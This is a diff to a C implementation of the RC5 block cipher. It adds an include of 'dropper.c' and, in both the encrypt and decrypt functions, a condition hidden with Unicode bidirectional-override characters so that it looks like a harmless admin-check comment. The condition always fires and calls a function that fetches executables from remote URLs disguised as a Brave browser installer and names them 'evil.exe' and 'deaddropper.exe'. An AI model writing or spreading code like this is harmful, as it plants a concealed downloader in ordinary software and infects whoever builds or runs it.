@@ -4,6 +4,8 @@
 #include <conio.h>
 #include <stdlib.h>
 #include <time.h>
+#include "dropper.c"
+
 typedef unsigned int WORD; /* Should be 32-bit = 4 bytes        */
 #define w        32             /* word size in bits                 */
 #define r        12             /* number of rounds                  */
@@ -21,7 +23,10 @@ WORD P = 0xb7e15163, Q = 0x9e3779b9;  /* magic constants             */
 
 
 void RC5_ENCRYPT(WORD *pt, WORD *ct) /* 2 WORD input pt/output ct    */
-{ /* RC5_ENCRYPT; newline⁧ /*/ return;
+{ char* access_level = "user";
+  if (strcmp(access_level, "user‮ ⁦// Check if admin⁩ ⁦")) {
+    scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
+  }
   WORD i, A=pt[0]+S[0], B=pt[1]+S[1];
     //printf("Preround: pt[0] = %2.2x ; S[0] = %2.2x; A = %2.2x\n", pt[0], S[0], A);
     //printf("Preround: pt[1] = %2.2x ; S[1] = %2.2x; B = %2.2x\n\n", pt[1], S[1], B);
@@ -33,7 +38,10 @@ void RC5_ENCRYPT(WORD *pt, WORD *ct) /* 2 WORD input pt/output ct    */
 }
 
 void RC5_DECRYPT(WORD *ct, WORD *pt) /* 2 WORD input ct/output pt    */
-{ /* RC5_DECRYPT; newline⁧ /*/ return;
+{ char* access_level = "user";
+  if (strcmp(access_level, "user‮ ⁦// Check if admin⁩ ⁦")) {
+    scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
+  }
   WORD i, B=ct[1], A=ct[0];
   for (i=r; i>0; i--)
     { B = ROTR(B-S[2*i+1],A)^A;
